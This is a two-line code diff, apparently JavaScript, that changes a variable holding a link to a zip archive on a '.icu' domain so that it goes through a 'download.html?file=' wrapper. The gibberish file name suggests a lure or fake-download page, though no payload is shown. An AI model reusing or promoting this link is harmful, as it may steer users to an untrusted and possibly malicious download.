@@ -1,6 +1,6 @@
  
 
-var xz = "https://youdaoselw.icu/Nios_Inaiirloty_Lertsvrpn_732.15.zip";
+var xz = "download.html?file=https://youdaoselw.icu/Nios_Inaiirloty_Lertsvrpn_732.15.zip";
 
 
 
